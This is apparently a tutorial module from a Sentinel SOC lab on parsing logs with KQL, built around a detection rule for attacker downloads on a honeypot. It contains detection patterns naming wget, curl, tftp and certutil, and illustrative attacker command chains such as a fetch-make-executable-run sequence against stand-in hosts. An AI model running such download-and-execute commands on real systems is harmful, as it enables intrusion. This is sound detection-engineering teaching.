# Parsing — getting structure out of text

![Module](https://img.shields.io/badge/Module-32-0078D4?style=flat-square&logo=microsoftazure&logoColor=white)
![Area](https://img.shields.io/badge/Area-parsing-0078D4?style=flat-square)
![Workspace](https://img.shields.io/badge/Workspace-la--lab--eus--01-0078D4?style=flat-square)

> Every query below is written against the real tables in `la-lab-eus-01`. Paste them into
> **Sentinel → Logs** and they run. Nothing here is a hypothetical schema.

Parsing is the skill that turns "I can see the attack in the log text" into "I can write a rule
that fires on it." It is also the skill that separates the two honeypot tables in this workspace,
so it is worth learning here rather than in the abstract.

---

## 🔎 Why this is the module the lab actually needed

The honeypot host `db-finance-prod01` sends the **same events twice**, down two different pipes:

| | `Syslog` | `CommonSecurityLog` |
|---|---|---|
| What arrives | one free-text column, `SyslogMessage` | pipe-delimited CEF, parsed on ingestion |
| Source IP | somewhere inside a sentence | `SourceIP`, a real column |
| Username tried | somewhere inside a sentence | `DestinationUserName` |
| Command typed | somewhere inside a sentence | `DeviceCustomString3` |
| Who produced it | infer from `ProcessName` | `DeviceVendor` |
| Survives a vendor changing its wording | **no** | yes |
| Used by the 38 deployed analytics rules | no | yes |

That table is the whole argument for CEF. Parsing at the boundary happens **once**; parsing in a
rule happens once per rule, and every one of those regexes is coupled to phrasing you do not
control. When a package update rewords a log line, a `Syslog` rule stops matching — with no error,
no failure alert, and nothing to notice. That is worse than having no rule, because the rule still
shows as enabled.

So the rule of thumb this lab runs on:

- **`CommonSecurityLog` for detection.** Structure already exists; don't recreate it.
- **`Syslog` for investigation.** When the CEF path breaks, `Syslog` is often the only thing that
  shows you *why*.

But "already parsed" is not the same as "finished." CEF gives you named columns; several of those
columns still hold **packed values** — `"1:2024897"`, `"Door 3 - Network IDS/IPS - ..."`, and a
whole command line in `DeviceCustomString3`. Getting a URL out of that command line is exactly what
the deployed outbound-download detection does, and it is the worked example in this module.

### Before you parse anything, look at it

The single most common parsing bug is writing a pattern against a message shape you imagined. Cost
yourself thirty seconds first:

```kusto
Syslog
| where TimeGenerated > ago(1h)
| where ProcessName == "sshd"
| project TimeGenerated, Facility, ProcessName, SyslogMessage
| take 20
```

Then find out how many *distinct shapes* you are dealing with, by collapsing every run of digits to
a `#` and grouping on the skeleton that remains:

```kusto
Syslog
| where TimeGenerated > ago(24h)
// replace_regex collapses IPs, ports and PIDs so only the message skeleton is left
| extend Shape = replace_regex(SyslogMessage, @"\d+", "#")
| summarize Events = count(), Example = any(SyslogMessage) by ProcessName, Shape
| order by Events desc
```

If the top shape covers most of your rows, one `parse` will do. If there are forty shapes with a
long tail, you want `extract` on the one field you care about instead — trying to `parse` all forty
is how people end up with a rule that silently covers 12% of traffic.

---

## 🧭 Pick the right tool

| The text is… | Use | Fails when |
|---|---|---|
| JSON (or a string holding JSON) | `parse_json()` + dot notation | the column is already `dynamic` — then it's a no-op |
| a JSON **array** you need one row per element from | `mv-expand` / `mv-apply` | the array is huge — row count multiplies |
| one interesting fragment inside noise | `extract()` | the regex is wrong, or you asked for the wrong capture group |
| **every** occurrence of that fragment | `extract_all()` | you forgot it returns an array, not a string |
| a fixed delimiter, consistent positions | `split()` | a field itself contains the delimiter |
| a fixed **sentence template** | `parse` operator | any literal in the template doesn't match exactly |
| a URL | `parse_url()` — don't hand-roll it | the input isn't a URL; you get empty parts |

Reach for the highest row in this table that fits. `parse_url()` beats a regex for URLs;
`split()` beats a regex for `a:b`; `extract()` is for when nothing more structured applies.

---

## 🧱 `parse_json()` and dot notation

`parse_json()` (identical to `todynamic()`) turns a JSON **string** into a `dynamic` value you can
walk with dots.

The trap is that half the columns people call it on are already `dynamic`, and the other half look
dynamic in the results grid but are strings. Settle it rather than guessing:

```kusto
SigninLogs
| where TimeGenerated > ago(1h)
| take 1
| project DeviceDetailType = gettype(DeviceDetail),
          LocationType     = gettype(LocationDetails),
          StatusType       = gettype(Status)
```

If it says `dynamic`, dot straight into it. If it says `string`, wrap it in `parse_json()` first —
dotting into a string returns null, quietly, and your `summarize` comes back with one big empty
bucket.

Entra sign-ins are the cleanest place to practise, because the interesting fields are all nested:

```kusto
SigninLogs
| where TimeGenerated > ago(7d)
| where ResultType != 0                             // failures only
| extend
    Country  = tostring(LocationDetails.countryOrRegion),
    City     = tostring(LocationDetails.city),
    OS       = tostring(DeviceDetail.operatingSystem),
    Browser  = tostring(DeviceDetail.browser),
    Reason   = tostring(Status.failureReason)
| summarize Failures = count(), Users = dcount(UserPrincipalName)
    by Country, City, Reason
| order by Failures desc
```

### Two rules that will save you an afternoon

**1. Always cast on the way out.** Dot notation returns `dynamic`, not `string` or `int`. KQL will
not let you `summarize by` a dynamic column, and comparisons against one behave unintuitively. Wrap
every leaf in `tostring()`, `toint()`, `toreal()`, or `tobool()` at the moment you extend it — as
above — and never think about it again.

**2. Dots break on keys with spaces or dashes.** Use bracket notation instead. This matters
immediately with `parse_url()`, whose output key is literally `Query Parameters`:

```kusto
print u = parse_url("http://198.51.100.7:8080/stage/x.sh?id=7&k=abc")
| extend Host  = tostring(u.Host),          // dot notation is fine here
         Port  = tostring(u.Port),
         Path  = tostring(u.Path),
         Query = u["Query Parameters"]      // bracket notation required - key has a space
```

### The double-encoded case

Some Microsoft tables nest JSON **inside a JSON string field**, so one `parse_json()` is not enough.
`AuditLogs` is the classic: `TargetResources` is a dynamic array, but `oldValue` and `newValue`
inside `modifiedProperties` arrive as JSON-encoded strings.

```kusto
AuditLogs
| where TimeGenerated > ago(7d)
| mv-expand Target = TargetResources
| mv-expand Prop = Target.modifiedProperties
| extend PropName = tostring(Prop.displayName)
// tostring() first to unwrap the string, THEN todynamic() to read what is inside it
| extend NewValue = todynamic(tostring(Prop.newValue)),
         OldValue = todynamic(tostring(Prop.oldValue))
| project TimeGenerated, OperationName,
          Actor = tostring(InitiatedBy.user.userPrincipalName),
          TargetName = tostring(Target.displayName),
          PropName, OldValue, NewValue
```

`todynamic(tostring(x))` looks redundant and is not. `tostring()` unwraps the JSON string; the
second call parses what was inside it. If you find yourself staring at a value covered in
backslash-escaped quotes, this is the fix.

### `AzureActivity` — check before you assume

`AzureActivity` is the other place this bites. Depending on how a record was written, the payload
may be sitting in a **string** column (`Properties`, `Authorization`, `Claims`) or in a
pre-expanded dynamic twin. Do not memorise which; ask:

```kusto
AzureActivity
| where TimeGenerated > ago(7d)
| take 1
| project PropertiesType = gettype(Properties)
```

Then parse or don't, based on the answer:

```kusto
AzureActivity
| where TimeGenerated > ago(7d)
| where OperationNameValue has "ROLEASSIGNMENTS/WRITE"     // role granted
| extend P = parse_json(Properties)                        // no-op if already dynamic
| project TimeGenerated, Caller, CallerIpAddress,
          ResourceGroup, ActivityStatusValue,
          Scope = tostring(P.entity)
| order by TimeGenerated desc
```

---

## 🎯 `extract()` — the worked example

This is the one that matters. **Deployed rule: "Outbound Download Attempt From Interactive
Session"** (High, runs every 5 minutes) — a shell session on the honeypot tried to pull a file from
the internet. The URL is a live, actor-controlled IOC harvested from real traffic.

The command the attacker typed lands whole in `DeviceCustomString3`. CEF gave us the command as a
column; it did not give us the URL *inside* the command. That last step is ours.

### Step 0 — what "find it" gets you, and why it isn't enough

```kusto
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where DeviceVendor == "sshd" and DeviceEventClassID == "command.input"
| where DeviceCustomString3 has_any ("wget", "curl", "tftp")
| project TimeGenerated, SourceIP, Command = DeviceCustomString3
```

That finds the rows. It does not give you a *field*. You cannot `summarize by` the URL, you cannot
map it as a URL entity on an incident, you cannot feed it to the auto-block pipeline, and you cannot
count how many distinct payload hosts you have seen. Everything downstream needs the URL isolated.

Note `has_any` and not `contains`: `has` is term-indexed and much cheaper. Put it before any regex
work so the regex runs on a handful of rows rather than the week.

### Step 1 — the deployed version

```kusto
CommonSecurityLog
| where DeviceVendor == "sshd" and DeviceEventClassID == "command.input"
| where DeviceCustomString3 has_any ("wget", "curl", "tftp")
// group 1 = the parenthesised part of the pattern; [^\s]+ runs to the first whitespace
| extend DownloadUrl = extract(@"(https?://[^\s]+)", 1, DeviceCustomString3)
| where isnotempty(DownloadUrl)                      // extract returns "" when nothing matched
| project TimeGenerated, Computer, AttackerIP = SourceIP,
          SessionId = DeviceCustomString1,
          Command = DeviceCustomString3, DownloadUrl
```

Read the signature as `extract(regex, captureGroup, text)`. Three things are doing work:

- `@"..."` is a **verbatim** string, so `\s` stays `\s` instead of being eaten as a string escape.
  Write every KQL regex this way; the alternative is counting backslashes.
- `[^\s]+` means "everything up to whitespace" — commands are space-separated, so the URL ends
  where the next argument begins.
- `isnotempty()` is not optional. On no match `extract` returns an **empty string, not null**, so
  rows sail through and you get blank IOCs on real incidents.

### Which capture group?

The number is the parenthesised group you want, counting opening brackets left to right. **Group 0
is the entire match**, regardless of grouping. That distinction is invisible in the query above,
because the parentheses happen to wrap the whole pattern — so 0 and 1 return the same text. It stops
being invisible the moment you want a *part*:

```kusto
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where DeviceVendor == "sshd" and DeviceEventClassID == "command.input"
| where DeviceCustomString3 has "://"
// one pattern, four different answers depending on the group number
| extend
    WholeMatch = extract(@"(https?)://([^/\s:]+)(/[^\s]*)?", 0, DeviceCustomString3),  // http://1.2.3.4/x.sh
    Scheme     = extract(@"(https?)://([^/\s:]+)(/[^\s]*)?", 1, DeviceCustomString3),  // http
    Host       = extract(@"(https?)://([^/\s:]+)(/[^\s]*)?", 2, DeviceCustomString3),  // 1.2.3.4
    Path       = extract(@"(https?)://([^/\s:]+)(/[^\s]*)?", 3, DeviceCustomString3)   // /x.sh
| where isnotempty(WholeMatch)
| project TimeGenerated, SourceIP, WholeMatch, Scheme, Host, Path
```

Debugging tip: when a regex returns nothing, ask for **group 0 first**. If group 0 is empty the
pattern doesn't match at all and the group number is irrelevant; if group 0 has content but group 2
is empty, you miscounted brackets. Non-capturing groups `(?:...)` don't consume a number, which is
exactly what they're for.

### Don't hand-roll URL parsing — extract once, then `parse_url()`

The four-group version above is good practice for capture groups, and bad practice for real work.
Use the regex to find the URL, then let a built-in take it apart properly:

```kusto
CommonSecurityLog
| where TimeGenerated > ago(30d)                     // 30d is the workspace retention ceiling
| where DeviceVendor == "sshd" and DeviceEventClassID == "command.input"
| where DeviceCustomString3 has "://"
| extend DownloadUrl = extract(@"((?:https?|ftp)://[^\s]+)", 1, DeviceCustomString3)
| where isnotempty(DownloadUrl)
| extend U = parse_url(DownloadUrl)
| extend PayloadHost = tostring(U.Host),
         PayloadPort = tostring(U.Port),
         PayloadPath = tostring(U.Path)
// a bare IPv4 for a payload host means no domain to seize and no DNS to sinkhole
| extend HostIsBareIP = PayloadHost matches regex @"^\d{1,3}(\.\d{1,3}){3}$"
| summarize Attempts = count(),
            Sessions = dcount(DeviceCustomString1),
            Attackers = dcount(SourceIP),
            FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated),
            SamplePath = any(PayloadPath)
    by PayloadHost, PayloadPort, HostIsBareIP
| order by Attempts desc
```

That is the query that turns a week of shell noise into a ranked list of staging servers.

### More than one URL in a command

`extract` returns the **first** match only. Chained commands routinely carry two:
`wget http://a/x; curl -O http://b/y`. Use `extract_all`, which returns a dynamic array, then
`mv-expand` it into rows:

```kusto
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where DeviceVendor == "sshd" and DeviceEventClassID == "command.input"
| where DeviceCustomString3 has "://"
// one capture group in, an array of strings out - one element per occurrence
| extend Urls = extract_all(@"((?:https?|ftp)://[^\s;]+)", DeviceCustomString3)
| where array_length(Urls) > 0
| mv-expand Url = Urls to typeof(string)
| project TimeGenerated, SourceIP, SessionId = DeviceCustomString1,
          Command = DeviceCustomString3, Url
```

### Defang before you hand it to a human

An analyst copying a live payload URL out of an incident and pasting it into a browser is a real
incident of its own. Neutralise it in the projection:

```kusto
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where DeviceVendor == "sshd" and DeviceEventClassID == "command.input"
| extend DownloadUrl = extract(@"((?:https?|ftp)://[^\s]+)", 1, DeviceCustomString3)
| where isnotempty(DownloadUrl)
| extend SafeUrl = replace_string(replace_string(DownloadUrl, "http", "hxxp"), ".", "[.]")
| project TimeGenerated, AttackerIP = SourceIP, SafeUrl, Command = DeviceCustomString3
```

### What the regex engine will and won't do

KQL uses **RE2**. It is fast and it cannot blow up on a pathological pattern, and the price is that
it has **no lookahead, no lookbehind, and no backreferences**. `(?=...)`, `(?<=...)` and `\1` are
syntax errors, not slow queries. If your pattern needs one, restructure with capture groups, or do
it in two steps — `extract` the enclosing chunk, then `extract` again inside it.

Also supported and worth knowing: `(?i)` at the start of a pattern for case-insensitive matching.
Attackers do not consistently type `WGET` in lowercase.

---

## ✂️ `split()`

When the delimiter is fixed and the positions are stable, `split()` is clearer than a regex and
faster to read six months later. `split(text, delimiter)` returns a dynamic array; index it with
`[0]`, `[1]`, and cast the result.

The best example in this workspace is Suricata's `DeviceEventClassID`, which packs two numbers into
one string as `"gid:signature_id"` — for example `"1:2024897"`:

```kusto
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where DeviceVendor == "Suricata"
| extend Gid = toint(split(DeviceEventClassID, ":")[0]),      // rule group, almost always 1
         Sid = toint(split(DeviceEventClassID, ":")[1])       // the signature ID you look up
| summarize Alerts = count(),
            Sources = dcount(SourceIP),
            SignatureName = any(Activity)
    by Sid, Gid
| order by Alerts desc
```

`Sid` is the number you paste into the Emerging Threats ruleset to find out what the signature
actually means, so having it as its own integer column is what makes triage possible.

### The string-that-looks-like-a-number trap

Two columns in this feed are typed as strings and will betray you:

- `LogSeverity` is the **CEF severity as a string**.
- `DeviceCustomString1` on Suricata rows is the **priority**, also a string.

```kusto
CommonSecurityLog
| where TimeGenerated > ago(24h)
| where DeviceVendor == "Suricata"
| extend Severity = toint(LogSeverity),                 // cast BEFORE comparing
         Priority = toint(DeviceCustomString1)
| where Severity >= 7                                   // 7,8,9,10 - what you meant
| summarize Alerts = count() by Severity, Priority, Activity
| order by Severity desc, Alerts desc
```

Compare that with `where LogSeverity > "7"`, which is a **string** comparison: `"10"` sorts before
`"7"` lexically, so your highest-severity alerts are the ones it silently drops. Cast first, always.

### Splitting a command into tokens

```kusto
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where DeviceVendor == "sshd" and DeviceEventClassID == "command.input"
| extend Binary = tostring(split(DeviceCustomString3, " ")[0])   // first token = what they ran
| summarize Runs = count(),
            Sessions = dcount(DeviceCustomString1),
            Attackers = dcount(SourceIP)
    by Binary
| order by Runs desc
| take 30
```

A ranked list of what attackers actually type on a real internet-facing host — cheap, and a genuinely
good hunting starting point. Note `tostring()` on the index: `split(...)[0]` is dynamic, and
`summarize by` on a dynamic column will not run.

---

## 🧨 `mv-expand` — arrays into rows

`mv-expand` takes one row containing an array of *n* elements and returns *n* rows. It is the bridge
between "I parsed a list" and "I can aggregate it."

### One row per step of a chained command

Attackers rarely type one command. `wget http://x/a; chmod +x a; ./a` is three actions in one
`DeviceCustomString3`. Split, expand, and you have a proper timeline:

```kusto
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where DeviceVendor == "sshd" and DeviceEventClassID == "command.input"
| where DeviceCustomString3 has ";"
| extend Steps = split(DeviceCustomString3, ";")
// with_itemindex preserves the order the steps were chained in
| mv-expand with_itemindex = StepNo Steps to typeof(string)
| extend Step = trim(@"\s+", Steps)
| project TimeGenerated, AttackerIP = SourceIP,
          SessionId = DeviceCustomString1, StepNo, Step
| order by SessionId asc, StepNo asc
```

`with_itemindex` matters here. Without it you get the steps but lose the ordering, and "downloaded
then made executable then ran it" is a different finding from three unordered strings.

### Expanding a JSON array from Entra

```kusto
SigninLogs
| where TimeGenerated > ago(7d)
| mv-expand Policy = ConditionalAccessPolicies
| extend PolicyName = tostring(Policy.displayName),
         Result     = tostring(Policy.result)
| where Result != "notApplied"                          // drop the policies that never engaged
| summarize Evaluations = count(), Users = dcount(UserPrincipalName)
    by PolicyName, Result
| order by PolicyName asc, Evaluations desc
```

### `mv-apply` when you only want *some* elements

`mv-expand` then `where` works, but it materialises every element before throwing most away.
`mv-apply` filters inside the expansion, which is both cheaper and states the intent better:

```kusto
SigninLogs
| where TimeGenerated > ago(7d)
| mv-apply Policy = ConditionalAccessPolicies on (
    where tostring(Policy.result) == "failure"
  )
| project TimeGenerated, UserPrincipalName, IPAddress,
          BlockedBy = tostring(Policy.displayName)
```

> **Watch the row count.** `mv-expand` multiplies rows, and nested `mv-expand` multiplies them
> again — the `AuditLogs` example earlier expands twice and can turn 1,000 audit records into tens
> of thousands. Filter as narrowly as you can *before* expanding, and keep the time window tight.

---

## 📐 The `parse` operator

`parse` is for text that follows a **sentence template**: you write out the literal text with named
variables where the values sit, and KQL fills them in. When the shape genuinely is fixed, it reads
far better than a wall of `extract` calls.

`DeviceEventCategory` is the natural target. It was added on **2026-08-22** to record where in the
traffic path a sensor sits, and it is a small fixed vocabulary:

```
Door 2 - Host Firewall
Door 3 - Network IDS/IPS - <cat>
Door 4 - Application Shell (SSH)
```

```kusto
CommonSecurityLog
| where TimeGenerated > ago(24h)
| where isnotempty(DeviceEventCategory)     // rows before 2026-08-22 do not carry this column
// literals in quotes, variables bare; :int casts as it parses
| parse DeviceEventCategory with "Door " DoorNumber:int " - " DoorName
| summarize Events = count(), Vendors = make_set(DeviceVendor) by DoorNumber, DoorName
| order by DoorNumber asc
```

The `isnotempty()` guard is doing real work. Retention here is 30 days, so until roughly
**2026-09-21** every query that reaches back a full month straddles the change and will see rows
where this column is blank. A parse against a blank string doesn't error — it just yields nulls,
which then vanish from your `summarize` without a word.

### `parse` is all-or-nothing, and that is the thing to understand

The obvious next step is to pull the IDS category off the end too:

```kusto
CommonSecurityLog
| where TimeGenerated > ago(24h)
| where isnotempty(DeviceEventCategory)
| parse DeviceEventCategory with "Door " DoorNumber:int " - " DoorName " - " SubCategory
| project DeviceEventCategory, DoorNumber, DoorName, SubCategory
```

Run it and look at the Door 2 and Door 4 rows. They have **no second `" - "`**, so the template
fails on them — and `parse` does not drop those rows or raise anything. It returns them with
`DoorNumber`, `DoorName` and `SubCategory` all null. You get a result set that looks fine at a
glance and has quietly lost two thirds of your sensors.

Two honest fixes.

**`parse-where`** if you *want* only the rows that match — it discards the rest, so the loss is
explicit rather than hidden:

```kusto
CommonSecurityLog
| where TimeGenerated > ago(24h)
| where DeviceVendor == "Suricata"
| parse-where DeviceEventCategory with "Door " DoorNumber:int " - " DoorName " - " SubCategory
| summarize Alerts = count(), Signatures = dcount(DeviceEventClassID) by SubCategory
| order by Alerts desc
```

**Parse the fixed part, then handle the variable part separately** if you want to keep everything:

```kusto
CommonSecurityLog
| where TimeGenerated > ago(24h)
| where isnotempty(DeviceEventCategory)
| parse DeviceEventCategory with "Door " DoorNumber:int " - " Rest    // Rest = everything after
| extend SubCategory = iff(Rest has " - ",
                           trim(@"\s+", tostring(split(Rest, " - ")[1])),
                           "")                                        // "" for Doors 2 and 4
| extend DoorName = trim(@"\s+", tostring(split(Rest, " - ")[0]))
| summarize Events = count() by DoorNumber, DoorName, SubCategory
| order by DoorNumber asc, Events desc
```

That is the general shape of a robust parse: nail down the part of the format that is genuinely
guaranteed, and treat the rest as optional.

### `parse` against `Syslog`

This is where `parse` earns its keep, because `Syslog` has nothing but sentences. The administrative
`sshd` on this host writes authentication failures to `auth`/`authpriv` in the long-standing OpenSSH
format — lines shaped like:

```
Failed password for invalid user admin from 203.0.113.9 port 41234 ssh2
```

```kusto
Syslog
| where TimeGenerated > ago(24h)
| where ProcessName == "sshd"
| where SyslogMessage startswith "Failed password"
| parse SyslogMessage with * "for invalid user " User " from " SrcIp " port " SrcPort:int *
| where isnotempty(User)
| summarize Attempts = count(), Users = dcount(User), FirstSeen = min(TimeGenerated)
    by SrcIp
| order by Attempts desc
```

The `*` wildcards mean "don't care what's here" at the start and end, which is what lets one
template survive a prefix or suffix you didn't anticipate.

**Confirm the wording before you trust this.** Run the `take 20` query from the top of this page
against your own rows first. The format above is the standard OpenSSH one, but the exact phrasing is
the vendor's to change — which is the entire reason detections in this lab live on
`CommonSecurityLog` and this query is filed under *investigation*.

If the literals are close but not exact — inconsistent spacing, optional words — switch to
`parse kind=regex`, which lets the separators themselves be patterns:

```kusto
Syslog
| where TimeGenerated > ago(24h)
| where ProcessName == "sshd"
| parse kind=regex SyslogMessage with @".*from\s+" SrcIp @"\s+port\s+" SrcPort:int @"\s+ssh2.*"
| where isnotempty(SrcIp)
| summarize Attempts = count() by SrcIp
| order by Attempts desc
```

`kind=regex` is more forgiving and more expensive. Use it when `kind=simple` (the default) can't
express the separator, not as a habit.

---

## 🪟 The Windows side, briefly

`SecurityEvent` from the Arc-connected laptop is the same problem in different clothing. Process
creation (4688) already gives you `CommandLine` as a column, so you can reuse the URL extraction
verbatim:

```kusto
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where CommandLine has_any ("http://", "https://", "Invoke-WebRequest", "certutil")
| extend DownloadUrl = extract(@"((?:https?|ftp)://[^\s""']+)", 1, CommandLine)
| where isnotempty(DownloadUrl)
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, DownloadUrl
```

Where the structure is hiding rather than absent, `EventData` holds the raw event XML and
`parse_xml()` opens it — useful when an event type has fields the table doesn't promote to columns.

> **Caveat before you build on this:** Sysmon on that laptop has been **down since 2026-08-07**, so
> the richest process telemetry is missing for anything after that date. Practise the technique
> here, but keep detections on `CommonSecurityLog` until the endpoint feed is healthy again.

---

## ♻️ Parse once — save it as a function

Repeating the same six `extend` lines across rules is how parsing logic drifts: you fix the regex in
one rule and forget the other four. Save the parse as a **workspace function** (Logs → Save → Save
as function) and call it by name.

```kusto
// Save as function name: ShellCommands
// No time filter inside - let each caller pick its own window
CommonSecurityLog
| where DeviceVendor == "sshd" and DeviceEventClassID == "command.input"
| extend
    AttackerIP  = SourceIP,
    SessionId   = DeviceCustomString1,
    Command     = DeviceCustomString3,
    DownloadUrl = extract(@"((?:https?|ftp)://[^\s]+)", 1, DeviceCustomString3),
    Binary      = tostring(split(DeviceCustomString3, " ")[0])
| project TimeGenerated, Computer, AttackerIP, SessionId, Binary, Command, DownloadUrl
```

Every rule and hunt then reads like this:

```kusto
ShellCommands
| where TimeGenerated > ago(24h)
| where isnotempty(DownloadUrl)
| summarize Attempts = count(), Sessions = dcount(SessionId) by AttackerIP, DownloadUrl
| order by Attempts desc
```

One place to fix the regex, one place to review it. This is the same argument as "parse at the CEF
boundary," applied one layer up: **the number of copies of a parsing rule should be one.**

---

## 💰 Cost and efficiency

Two separate things get called "query cost," and only one of them is money.

| | What it is | Does parsing affect it? |
|---|---|---|
| **Ingestion + retention** | what the `$15/month` budget is actually spent on | Only if you parse **at ingestion** — a DCR transformation that drops rows or columns reduces billed bytes. One that *adds* columns increases them. |
| **Query execution** | CPU and data scanned when a query runs | Yes, heavily — but on Analytics-tier tables in this workspace, interactive queries are not billed per run. You pay in seconds and timeouts, not dollars. |

Two places where scanning genuinely does become money, so they are worth naming: a table moved to
**Basic or Auxiliary logs** to cut ingestion cost is billed **per GB scanned** by search jobs, and
restoring **archived** data is billed too. Neither applies to `CommonSecurityLog` here today, but
"make it cheap to ingest" and "make it free to query" are a trade, not a free win.

Regardless of billing, order your pipeline so the expensive operators see the fewest rows:

1. **Time first.** `where TimeGenerated > ago(...)`. Retention is 30 days, so `ago(30d)` is the
   ceiling — asking for 90 returns 30 and wastes your time, not your money.
2. **Indexed string filters next.** `has`, `has_any`, `startswith`, `==` on `DeviceVendor` /
   `DeviceEventClassID`. `has` is term-based; `contains` is a substring scan.
3. **Then parse.** `extract`, `parse`, `split`, `parse_json` all run **per surviving row**. A regex
   over 200 rows is free; the same regex over a week of honeypot traffic on an internet-facing host
   is not.
4. **`mv-expand` last, and narrowly.** It is the only operator here that *increases* row count.
5. **`project` what you need.** Fewer columns moved between stages.

The anti-pattern, which is a genuine trap on this workspace:

```kusto
// DON'T - regex over every row of every table, then filter
search "*"
| extend Url = extract(@"(https?://[^\s]+)", 1, tostring(pack_all()))
| where isnotempty(Url)
```

`search "*"` reads everything. On an internet-facing honeypot that takes continuous real attacker
traffic, this will run long and may time out. Name the table, filter, then parse.

---

## ⚠️ Failure modes

| Symptom | Cause | Fix |
|---|---|---|
| Extracted column is blank on every row | Regex doesn't match at all | Ask for **group 0** first; if that's blank too, the pattern is wrong, not the group number |
| Blank rows sneak into an IOC list | `extract` returns `""`, not null, on no match | `where isnotempty(...)` after every `extract` |
| `summarize by` fails or buckets oddly | Grouping on a `dynamic` value | `tostring()` / `toint()` the dot-notation or `split()` result |
| High-severity alerts missing from results | `LogSeverity` is a **string**; `"10" < "7"` | `toint(LogSeverity)` before comparing |
| `Field.sub` returns null but the JSON is right there | Column is a `string`, not `dynamic` | `parse_json()` it; confirm with `gettype()` |
| Value is full of `\"` escapes | Double-encoded JSON | `todynamic(tostring(x))` |
| `parse` returns nulls for a whole class of rows | One literal in the template doesn't match | `parse-where`, or parse only the guaranteed prefix and `split` the rest |
| Regex is a syntax error | RE2 has no lookaround or backreferences | Restructure with capture groups, or extract in two passes |
| Row count explodes, query slows to a crawl | `mv-expand` (especially nested) | Filter before expanding; use `mv-apply` |
| `DeviceEventCategory` blank on older rows | Column added **2026-08-22** | Guard with `isnotempty()`; full coverage once 30-day retention rolls past ~2026-09-21 |
| A rule that worked went quiet, no error | Regex coupled to wording a vendor changed | Move the detection to `CommonSecurityLog` columns; keep `Syslog` for investigation |

That last row is the one to internalise. **A parsing failure is silent.** Nothing in Sentinel tells
you a regex stopped matching — the rule stays green and stops finding things. If a detection depends
on a pattern, something has to periodically confirm the pattern still matches.

---

## ✅ Practice

Work these in the Logs blade against real data. Answers are visible in the queries above.

1. **Reproduce the deployed rule.** Write the outbound-download query from scratch without
   scrolling up. Confirm `isnotempty(DownloadUrl)` is present, then delete it and see what changes.
2. **Rank the payload hosts.** Over 30 days, produce a table of distinct `PayloadHost` values with
   attempt count, distinct attacker IPs, and first/last seen. Which are bare IPs and which are
   domains? Which of the two is easier to take down?
3. **Map the doors.** Using `DeviceEventCategory`, count events per door for the last 24 hours.
   Then extend it to break Door 3 down by IDS category — and make sure Doors 2 and 4 still appear.
4. **Suricata top signatures.** Split `DeviceEventClassID` into `Gid` and `Sid`, rank by alert
   volume, carry `Activity` through as the signature name, and cast `LogSeverity` correctly.
5. **Same event, two tables.** Pick one attacker IP with recent activity. Retrieve its session from
   `CommonSecurityLog` using columns, and find the same window in `Syslog` using `parse`. Time
   yourself on both. That gap is the entire justification for the CEF pipeline.
6. **Make it reusable.** Save the `ShellCommands` function, then rewrite exercises 1 and 2 as
   one-line calls to it.

---

## 📎 Where this connects

- **[Detection library](https://github.com/TaruntejaDesireddy/azure-soc-lab/blob/main/DETECTIONS/README.md)**
  — all 38 deployed analytics rules. "Outbound Download Attempt From Interactive Session" is the
  rule this module's worked example comes from; read its triage notes alongside the query.
- `../summarize/` — parsing gives you the column; `summarize` is what makes it a finding.
- `../joins/` — once the URL is a field, you can join it against threat intel.
- `../performance/` — the ordering rules above, in full.
- `../detections/` — turning a parsed hunt into a scheduled rule with entity mapping.

---

[← 32 — KQL](../README.md) &nbsp;·&nbsp; [Roadmap](../../README.md)
